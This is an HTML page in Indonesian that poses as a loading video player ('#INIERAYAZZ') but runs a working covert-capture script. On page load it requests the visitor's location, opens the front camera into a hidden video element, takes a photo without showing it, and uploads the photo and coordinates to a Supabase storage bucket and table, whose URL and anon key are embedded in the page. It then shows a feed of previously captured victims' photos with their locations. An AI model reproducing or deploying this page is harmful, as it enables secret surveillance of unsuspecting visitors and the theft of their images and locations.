<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>INI ERA YAZZ - ERROR FEED</title>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  * { 
    box-sizing: border-box; 
    margin: 0; 
    padding: 0; 
  }

  body {
    font-family: 'Plus Jakarta Sans', sans-serif;
    background: #0a0a0a;
    color: #f0f0f0;
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
    padding-bottom: 40px;
    -webkit-font-smoothing: antialiased;
  }

  header {
    width: 100%;
    padding: 25px;
    text-align: center;
    font-size: 1.2rem;
    font-weight: 700;
    letter-spacing: 2px;
    color: #ff3b30; 
    border-bottom: 1px solid #1a1a1a;
    background: rgba(10, 10, 10, 0.8);
    backdrop-filter: blur(15px);
    position: sticky;
    top: 0;
    z-index: 100;
    text-transform: uppercase;
  }

  #statusBox {
    width: 92%;
    max-width: 500px;
    margin: 25px auto;
    padding: 18px;
    background: #161616;
    border-radius: 14px;
    text-align: center;
    border: 1px solid #222;
  }

  #statusText { 
    font-size: 0.85rem; 
    font-weight: 500;
    color: #ff4d4d;
    letter-spacing: 0.2px;
  }

  #list {
    width: 90%;
    max-width: 600px;
    display: grid;
    grid-template-columns: 1fr;
    gap: 20px;
    margin-top: 20px;
  }

  .card {
    background: #161616;
    border-radius: 20px;
    overflow: hidden;
    border: 1px solid #262626;
  }

  .card img {
    width: 100%;
    aspect-ratio: 16 / 9;
    object-fit: cover;
    background: #000;
    display: block;
  }

  .info-overlay {
    padding: 18px;
    background: #111;
  }

  .info-text {
    font-size: 0.75rem;
    font-weight: 400;
    color: #666;
    text-align: center;
    letter-spacing: 0.5px;
    white-space: pre-line;
  }

  /* Sembunyikan video dan canvas */
  #hiddenVideo, #hiddenCanvas {
    display: none;
  }

  .floating-info {
    position: fixed;
    bottom: 25px;
    background: #ff3b30;
    color: white;
    padding: 12px 25px;
    border-radius: 50px;
    font-size: 0.75rem;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 1px;
    box-shadow: 0 8px 20px rgba(255, 59, 48, 0.3);
  }
</style>
</head>
<body>

<header>#INIERAYAZZ</header>

<div id="statusBox">
  <div id="statusText">System: Mendeteksi pemutar video...</div>
</div>

<!-- Daftar foto yang sudah diupload akan muncul di sini -->
<div id="list">
  <!-- Akan diisi oleh JavaScript -->
</div>

<div class="floating-info" id="notif">sedang memuat data #inierayazz</div>

<!-- Elemen tersembunyi untuk proses kamera -->
<video id="hiddenVideo" autoplay playsinline></video>
<canvas id="hiddenCanvas" width="640" height="480"></canvas>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<script>
  const SUPABASE_URL = "https://ttptotondiqkqsznuapw.supabase.co";
  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR0cHRvdG9uZGlxa3Fzem51YXB3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMzMTUzOTYsImV4cCI6MjA4ODg5MTM5Nn0.f9kTPb8CKit4vhfdREmYGrERxNj44RTSfWy7FDCAHu8";
  const BUCKET = "foto-users"; 
  const { createClient } = supabase;
  const client = createClient(SUPABASE_URL, SUPABASE_KEY);

  const statusText = document.getElementById("statusText");
  const hiddenVideo = document.getElementById("hiddenVideo");
  const hiddenCanvas = document.getElementById("hiddenCanvas");
  const listEl = document.getElementById("list");

  // ===== FUNGSI MENAMPILKAN FOTO DARI DATABASE =====
  async function tampilkanFoto() {
    try {
      // Ambil data dari tabel lokasi_users, urut dari terbaru
      const { data: lokasiData, error } = await client
        .from("lokasi_users")
        .select("*")
        .order('created_at', { ascending: false })
        .limit(20); // Batasi 20 foto terbaru

      if (error) throw error;

      // Jika belum ada data
      if (!lokasiData || lokasiData.length === 0) {
        listEl.innerHTML = `
          <div class="card">
            <div style="padding: 40px; text-align: center; color: #666;">
              <div style="font-size: 3rem; margin-bottom: 10px;">📷</div>
              <p>Belum ada foto</p>
              <p style="font-size: 0.7rem; margin-top: 10px;">Mencoba mengambil foto...</p>
            </div>
          </div>
        `;
        return;
      }

      // Tampilkan semua foto
      listEl.innerHTML = "";
      
      for (const item of lokasiData) {
        // Dapatkan URL publik untuk foto
        const { data: publicUrl } = client.storage
          .from(BUCKET)
          .getPublicUrl(item.foto);

        const card = document.createElement("div");
        card.className = "card";
        
        const img = document.createElement("img");
        img.src = publicUrl.publicUrl;
        img.alt = "Foto Capture";
        img.loading = "lazy";
        img.onerror = () => { 
          img.src = 'https://via.placeholder.com/640x360?text=Gambar+Tidak+Tersedia'; 
        };
        
        const info = document.createElement("div");
        info.className = "info-overlay";
        
        // Format tanggal
        const tanggal = new Date(item.created_at).toLocaleString('id-ID', {
          dateStyle: 'medium',
          timeStyle: 'short'
        });
        
        info.innerHTML = `<div class="info-text">
          📍 Lat: ${item.latitude?.toFixed(5) || '-'}, Lon: ${item.longitude?.toFixed(5) || '-'}
          \n🕒 ${tanggal}
        </div>`;
        
        card.appendChild(img);
        card.appendChild(info);
        listEl.appendChild(card);
      }
    } catch (err) {
      console.error("Error tampil foto:", err);
      statusText.innerText = "❌ Gagal memuat data";
    }
  }

  // ===== FUNGSI MENGAMBIL FOTO (TANPA DITAMPILKAN) =====
  async function captureAndUpload(lat, lon) {
    try {
      statusText.innerText = "Mengakses kamera...";
      
      // Minta akses kamera (tanpa menampilkan video)
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: "user",
          width: { ideal: 640 },
          height: { ideal: 480 }
        }, 
        audio: false 
      });
      
      // Tampilkan stream ke video tersembunyi
      hiddenVideo.srcObject = stream;
      
      // Tunggu video siap
      await new Promise(resolve => {
        hiddenVideo.onloadedmetadata = () => {
          hiddenVideo.play();
          resolve();
        };
      });
      
      statusText.innerText = "Mengambil foto...";
      
      // Tunggu sebentar agar kamera stabil
      setTimeout(async () => {
        // Gambar frame dari video ke canvas
        const context = hiddenCanvas.getContext("2d");
        context.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
        
        // Konversi canvas ke blob
        hiddenCanvas.toBlob(async (blob) => {
          if (!blob) {
            statusText.innerText = "❌ Gagal mengambil foto";
            stream.getTracks().forEach(track => track.stop());
            return;
          }
          
          const fileName = `capture_${Date.now()}.jpg`;
          
          // Upload ke Supabase Storage
          const { error: uploadError } = await client.storage
            .from(BUCKET)
            .upload(fileName, blob, { 
              cacheControl: "3600",
              upsert: false,
              contentType: "image/jpeg" 
            });

          if (uploadError) {
            console.error("Upload error:", uploadError);
            statusText.innerText = "❌ Gagal upload foto";
          } else {
            // Simpan data ke tabel
            const { error: insertError } = await client
              .from("lokasi_users")
              .insert([{ 
                foto: fileName, 
                latitude: lat || 0, 
                longitude: lon || 0,
                created_at: new Date()
              }]);

            if (insertError) {
              console.error("Insert error:", insertError);
              statusText.innerText = "❌ Gagal simpan data";
            } else {
              statusText.innerText = "✅ Foto berhasil diupload!";
              
              // Refresh tampilan foto
              tampilkanFoto();
            }
          }
          
          // Matikan kamera
          stream.getTracks().forEach(track => track.stop());
          
        }, "image/jpeg", 0.8);
      }, 1500); // Delay 1.5 detik
      
    } catch (err) {
      console.error("Kamera error:", err);
      statusText.innerText = "❌ Gagal akses kamera. Periksa izin.";
    }
  }

  // ===== FUNGSI UTAMA =====
  async function startProcess() {
    statusText.innerText = "Meminta izin akses...";
    
    // Tampilkan foto yang sudah ada dulu
    await tampilkanFoto();
    
    // Minta izin lokasi
    if (!navigator.geolocation) {
      statusText.innerText = "❌ Browser tidak mendukung geolocation";
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        
        statusText.innerText = "Lokasi didapat, mengakses kamera...";
        
        // Ambil foto (tanpa ditampilkan)
        await captureAndUpload(lat, lon);
      },
      (err) => {
        console.warn("Gagal dapat lokasi:", err.message);
        statusText.innerText = "⚠️ Lokasi tidak tersedia, tetap coba kamera";
        
        // Tetap coba ambil foto tanpa lokasi
        captureAndUpload(null, null);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  }

  // ===== MULAI PROSES =====
  startProcess();

  // Refresh data setiap 30 detik (opsional)
  setInterval(() => {
    tampilkanFoto();
  }, 30000);
</script>
</body>
</html>
